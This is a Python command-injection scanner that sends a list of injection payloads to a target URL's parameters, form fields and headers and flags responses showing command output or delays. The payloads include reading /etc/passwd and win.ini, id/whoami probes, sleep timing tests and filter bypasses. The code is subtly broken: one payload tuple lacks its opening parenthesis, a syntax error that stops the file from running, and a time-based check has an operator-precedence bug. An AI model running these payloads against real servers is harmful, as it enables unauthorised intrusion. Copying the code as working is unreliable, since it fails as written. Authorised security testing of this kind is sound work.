#!/usr/bin/env python3
"""
Command Injection Scanner
Tests for OS command injection vulnerabilities
"""

import requests
import urllib.parse
import json
import time
from datetime import datetime
from bs4 import BeautifulSoup
import re

class CommandInjectionScanner:
    """OS Command Injection vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # Command injection payloads
        self.payloads = [
            # Unix/Linux commands
            (';id', ['uid=', 'gid=', 'groups=']),
            ('|id', ['uid=', 'gid=', 'groups=']),
            ('`id`', ['uid=', 'gid=', 'groups=']),
            ('$(id)', ['uid=', 'gid=', 'groups=']),
            ';whoami', ['root', 'www-data', 'apache', 'nginx']),
            ('|whoami', ['root', 'www-data', 'apache', 'nginx']),
            (';pwd', ['/var/', '/home/', '/usr/', '/etc/']),
            ('|pwd', ['/var/', '/home/', '/usr/', '/etc/']),
            (';ls', ['bin', 'etc', 'usr', 'var']),
            ('|ls', ['bin', 'etc', 'usr', 'var']),
            (';cat /etc/passwd', ['root:', 'daemon:', '/bin/bash']),
            ('|cat /etc/passwd', ['root:', 'daemon:', '/bin/bash']),

            # Windows commands
            ('&dir', ['Directory of', 'Volume Serial Number']),
            ('|dir', ['Directory of', 'Volume Serial Number']),
            ('&whoami', ['\\', 'DESKTOP-', 'SYSTEM']),
            ('|whoami', ['\\', 'DESKTOP-', 'SYSTEM']),
            ('&type c:\\windows\\win.ini', ['[fonts]', '[extensions]']),

            # Time-based (blind)
            (';sleep 5', None),
            ('|sleep 5', None),
            (';ping -c 5 127.0.0.1', None),
            ('&ping -n 5 127.0.0.1', None),

            # Advanced payloads
            ('";id;"', ['uid=', 'gid=']),
            ('\';id;\'', ['uid=', 'gid=']),
            ('`whoami`', ['root', 'www-data']),
            ('$(whoami)', ['root', 'www-data']),

            # Newline injection
            ('%0aid', ['uid=', 'gid=']),
            ('%0did%0d', ['uid=', 'gid=']),
            ('\nid\n', ['uid=', 'gid=']),

            # Double encoding
            ('%253Bid', ['uid=', 'gid=']),

            # Space bypass
            (';cat</etc/passwd', ['root:', 'daemon:']),
            (';cat<>/etc/passwd', ['root:', 'daemon:']),
            ('${IFS}id', ['uid=', 'gid=']),
        ]

    def scan(self):
        """Run command injection scan"""
        print(f"[*] Starting command injection scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test POST parameters
        self._test_post_parameters()

        # Test headers
        self._test_headers()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for command injection"""
        print("[*] Testing GET parameters...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            params = {
                'cmd': ['test'],
                'command': ['test'],
                'exec': ['test'],
                'file': ['test.txt'],
                'path': ['/tmp']
            }

        for param_name in params.keys():
            for payload, indicators in self.payloads:
                test_params = params.copy()

                # Try appending to existing value
                original_value = params[param_name][0] if params[param_name] else ''
                test_params[param_name] = [original_value + payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_payload(test_url, param_name, payload, indicators, 'GET'):
                    return  # Found vulnerability

    def _test_post_parameters(self):
        """Test POST parameters for command injection"""
        print("[*] Testing POST parameters...")

        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                # Try common POST parameters
                common_params = ['cmd', 'command', 'exec', 'file', 'path', 'name']
                for param in common_params:
                    for payload, indicators in self.payloads[:10]:
                        data = {param: payload}
                        if self._test_post_payload(self.target_url, data, param, payload, indicators):
                            return

            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()

                if method != 'POST':
                    continue

                action_url = urllib.parse.urljoin(self.target_url, action) if action else self.target_url

                # Get form data
                form_data = {}
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    name = input_field.get('name')
                    value = input_field.get('value', '')
                    if name:
                        form_data[name] = value

                # Test each field
                for field_name in form_data.keys():
                    for payload, indicators in self.payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        if self._test_post_payload(action_url, test_data, field_name, payload, indicators):
                            return

        except Exception as e:
            print(f"[!] Error testing POST: {e}")

    def _test_headers(self):
        """Test HTTP headers for command injection"""
        print("[*] Testing HTTP headers...")

        headers_to_test = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Forwarded-Host',
            'X-Original-URL',
            'X-Rewrite-URL'
        ]

        for header in headers_to_test:
            for payload, indicators in self.payloads[:5]:  # Test subset for headers
                custom_headers = {header: payload}

                try:
                    response = self.session.get(
                        self.target_url,
                        headers=custom_headers,
                        timeout=10
                    )

                    if indicators and self._check_indicators(response.text, indicators):
                        vuln = {
                            'type': 'Command Injection',
                            'severity': 'critical',
                            'url': self.target_url,
                            'parameter': f'Header: {header}',
                            'payload': payload,
                            'evidence': 'Command execution detected via header injection',
                            'cwe': 'CWE-78'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Command injection via header: {header}")
                        return True

                except Exception as e:
                    pass

        return False

    def _test_payload(self, url, param_name, payload, indicators, method):
        """Test single command injection payload"""
        try:
            start_time = time.time()
            response = self.session.get(url, timeout=15)
            elapsed = time.time() - start_time

            # Check for time-based injection
            if indicators is None and 'sleep' in payload.lower() or 'ping' in payload.lower():
                if elapsed >= 4.5:  # Should delay ~5 seconds
                    vuln = {
                        'type': 'Command Injection (Time-based)',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': f'Response delayed by {elapsed:.2f} seconds',
                        'cwe': 'CWE-78'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Time-based command injection: {param_name}")
                    return True

            # Check for output-based injection
            if indicators and self._check_indicators(response.text, indicators):
                vuln = {
                    'type': 'Command Injection',
                    'severity': 'critical',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'evidence': 'Command output detected in response',
                    'cwe': 'CWE-78'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] CRITICAL: Command injection in {param_name}")
                return True

        except requests.exceptions.Timeout:
            # Timeout might indicate time-based injection
            if 'sleep' in payload.lower() or 'ping' in payload.lower():
                vuln = {
                    'type': 'Command Injection (Time-based)',
                    'severity': 'critical',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'evidence': 'Request timeout indicates command execution',
                    'cwe': 'CWE-78'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Time-based command injection (timeout): {param_name}")
                return True

        except Exception as e:
            pass

        return False

    def _test_post_payload(self, url, data, field_name, payload, indicators):
        """Test POST command injection payload"""
        try:
            start_time = time.time()
            response = self.session.post(url, data=data, timeout=15)
            elapsed = time.time() - start_time

            # Time-based check
            if indicators is None and ('sleep' in payload.lower() or 'ping' in payload.lower()):
                if elapsed >= 4.5:
                    vuln = {
                        'type': 'Command Injection (Time-based)',
                        'severity': 'critical',
                        'url': url,
                        'parameter': field_name,
                        'payload': payload,
                        'method': 'POST',
                        'evidence': f'Response delayed by {elapsed:.2f} seconds',
                        'cwe': 'CWE-78'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Time-based command injection (POST): {field_name}")
                    return True

            # Output-based check
            if indicators and self._check_indicators(response.text, indicators):
                vuln = {
                    'type': 'Command Injection',
                    'severity': 'critical',
                    'url': url,
                    'parameter': field_name,
                    'payload': payload,
                    'method': 'POST',
                    'evidence': 'Command output detected in POST response',
                    'cwe': 'CWE-78'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] CRITICAL: Command injection (POST) in {field_name}")
                return True

        except Exception as e:
            pass

        return False

    def _check_indicators(self, response_text, indicators):
        """Check if any indicator is present in response"""
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 command_injection.py <url>")
        print("\nExample:")
        print("  python3 command_injection.py https://example.com/exec?cmd=test")
        sys.exit(1)

    scanner = CommandInjectionScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")

    if len(results['vulnerabilities']) > 0:
        print(f"\n[!] CRITICAL: Command injection vulnerabilities detected!")
        print(f"    These allow remote code execution on the server!")
        print(f"    Report immediately!")
